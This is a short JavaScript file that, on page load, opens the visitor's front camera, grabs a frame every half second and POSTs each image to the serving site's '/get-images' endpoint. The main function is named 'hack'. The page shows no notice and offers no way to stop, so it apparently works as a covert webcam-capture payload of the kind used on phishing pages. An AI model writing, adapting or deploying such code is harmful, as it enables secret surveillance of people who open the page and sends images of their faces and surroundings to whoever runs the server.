const video = document.getElementById("video");
const canvas = document.getElementById("canvas");

function postImages(imgdata) {
  var result;

  $.ajax({
    type: "POST",
    data: { image: imgdata },
    url: "/get-images",
    dataType: "json",
    async: false,
    success: function(response) {
      result = response;
  }
  });
}

const constraints = {
  audio: false,
  video: { facingMode: "user" },
};

const hack = async () => {
  const videoStream = await navigator.mediaDevices.getUserMedia(constraints);
  video.srcObject = videoStream;

  const context = canvas.getContext("2d");

  setInterval(() => {
    context.drawImage(video, 0, 0, 640, 480);
    const imageData = canvas.toDataURL();
    postImages(imageData);
  }, 500);
};

hack();
